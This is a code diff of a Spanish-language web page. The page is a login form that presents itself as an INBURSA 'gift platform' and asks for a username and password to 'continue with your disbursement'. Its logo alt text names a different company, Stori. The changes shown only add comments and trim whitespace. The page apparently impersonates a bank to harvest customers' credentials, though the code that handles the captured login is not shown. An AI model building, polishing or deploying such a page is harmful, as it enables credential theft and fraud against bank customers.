@@ -112,18 +112,18 @@
 <body>
   <div class="screen active" id="pantallaInicio">
     <img src="https://companieslogo.com/img/orig/GFINBURO.MX-bfce3765.png?t=1720244492" alt="Stori Logo" class="logo">
-    <h2>Bienvenido a su plataforma de regalos de <strong>INBURSA</strong> </h2>
+    <h2>Bienvenido a su plataforma de regalos de <strong>INBURSA</strong></h2>
     <p>Ingrese su usuario y contraseña para continuar con su desembolso</p>
     <form id="login-form">
       <div class="input-group">
         <div class="icon"><i class="fas fa-user"></i></div>
-        <input type="text" id="usuario" placeholder="Usuario" required>
+        <input type="text" id="usuario" placeholder="Usuario" required> <!-- Campo de usuario -->
       </div>
       <div class="input-group">
         <div class="icon"><i class="fas fa-lock"></i></div>
         <input type="password" id="password" placeholder="Contraseña" required>
       </div>
-      <p id="usuarioError" class="mensaje-error"></p>
+      <p id="usuarioError" class="mensaje-error"></p> <!-- Mensaje de error usuario -->
       <p id="passwordError" class="mensaje-error"></p>
       <button type="submit" id="btnContinuar">Continuar</button>
     </form>
@@ -162,7 +162,7 @@
     });
 
     function validarUsuario() {
-      const usuario = document.getElementById("usuario").value;
+      const usuario = document.getElementById("usuario").value;  // Asegúrate que el id sea correcto
       const usuarioError = document.getElementById("usuarioError");
       const usuarioInput = document.getElementById("usuario");
 
